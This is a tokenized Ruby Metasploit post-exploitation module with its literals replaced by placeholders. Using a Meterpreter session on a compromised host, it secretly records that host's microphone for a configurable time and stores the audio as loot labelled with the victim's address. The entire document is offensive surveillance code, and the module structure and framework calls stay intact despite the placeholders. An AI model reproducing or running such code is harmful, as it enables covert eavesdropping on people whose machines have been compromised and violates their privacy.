require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Auxiliary :: Report def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > <str> , <str> = > [ <str> ] ) ) register_options ( [ OptInt . new ( <str> , [ false , <str> , <int> ] ) ] , self . class ) end def rhost client . sock . peerhost end def progress duration = datastore [ <str> ] m = duration / <int> m = <int> if m == <int> duration . times do | i | if i % m == <int> p = ( ( Float ( ( i == <int> ) ? <int> : i + <int> ) / duration ) * <int> ) . round print_status ( <str> rhost <str> p . to_s <str> ) end select ( nil , nil , nil , <int> ) end end def run if client . nil? print_error ( <str> ) return end data = nil begin t = framework . threads . spawn ( <str> , false ) { progress } data = client . webcam . record_mic ( datastore [ <str> ] ) rescue Rex :: Post :: Meterpreter :: RequestError = > e print_error ( e . message ) return ensure t . kill end if data print_status ( <str> rhost <str> data . length . to_s <str> ) p = store_loot ( <str> rhost <str> , <str> , rhost , data , <str> rhost <str> , <str> rhost <str> ) print_good ( <str> rhost <str> p <str> ) end end end 
